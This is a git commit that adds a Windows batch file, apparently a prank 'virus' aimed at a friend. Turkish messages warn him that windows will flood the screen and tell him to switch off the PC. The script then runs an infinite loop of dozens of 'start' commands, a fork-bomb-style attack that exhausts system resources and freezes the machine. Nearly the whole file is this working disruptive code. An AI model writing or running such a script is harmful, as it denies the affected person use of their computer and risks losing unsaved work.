da344105ca7c9c1378c7462f5da75b74752b6654
ahmetmal313113-wq <ahmetmal313113@gmail.com>
2026-04-01 14:39:52 +0300

    Add files via upload

---
+++ başlangıç.bat
@@ -0,0 +1,82 @@
+@echo off
+echo lan yunus virus basladigi zaman asiri seri bir sekilde ekrana paneller gelecek izleme sakin
+echo direkt bilgisayari kapat sonra beni ara simdi entere bas
+pause
+cls
+echo hazir ol basliyor
+timeout 10
+@echo off
+echo bak eminsen son kez sayac aciyorum biraz bak sonra kapat
+timeout 5
+:loop
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+goto loop
